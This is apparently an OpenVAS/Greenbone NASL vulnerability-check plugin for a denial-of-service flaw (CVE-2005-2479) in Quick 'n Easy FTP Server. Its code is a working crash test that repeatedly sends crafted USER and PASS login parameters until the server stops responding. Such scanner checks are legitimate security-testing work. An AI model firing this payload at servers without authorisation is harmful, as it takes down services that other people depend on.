# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802003");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-03-09 16:08:21 +0100 (Wed, 09 Mar 2011)");
  script_cve_id("CVE-2005-2479");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Quick 'n Easy FTP Login Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("FTP");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/quick_n_easy/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16260");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/14451");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/98782");

  script_tag(name:"impact", value:"Successful exploitation will allow the remote attackers to cause
  a denial of service.");

  script_tag(name:"affected", value:"Quick 'n Easy FTP Server Version 3.2, other versions may also
  be affected.");

  script_tag(name:"insight", value:"The flaw is due to the way server handles 'USER' and 'PASS'
  commands, which can be exploited to crash the FTP service by sending 'USER'
  and 'PASS' commands with specially-crafted parameters.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Quick 'n Easy FTP Server is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

ftpPort = ftp_get_port(default:21);
banner = ftp_get_banner(port:ftpPort);
if(! banner || "Quick 'n Easy FTP Server" >!< banner)
  exit(0);

flag = 0;
craf_cmd = ""; # nb: To make openvas-nasl-lint happy...

for(i=0; i<15; i++)
{
  ## Open a Socket
  soc1 = open_sock_tcp(ftpPort);

  ## Exit if it's not able to open socket first time
  if(!soc1 && flag == 0){
    exit(0);
  }

  ## Server is crashed, If not able to open the socket
  if(!soc1){
    security_message(ftpPort);
    exit(0);
  }

  ## Server is crashed, If Server is not responding
  resp = recv_line(socket:soc1, length:100);
  if("Quick 'n Easy FTP Server" >!< resp){
    security_message(ftpPort);
    exit(0);
  }

  craf_cmd +=  "aa" + "?";
  send(socket:soc1, data: 'USER '+ craf_cmd + '\r\n');
  recv_line(socket:soc1, length:100);
  send(socket:soc1, data: 'PASS '+ craf_cmd + '\r\n');
  resp = recv_line(socket:soc1, length:100);

  if("530 Not logged in, user or password incorrect!" >< resp)
  {
    soc = open_sock_tcp(ftpPort);
    close(soc);
  }
}
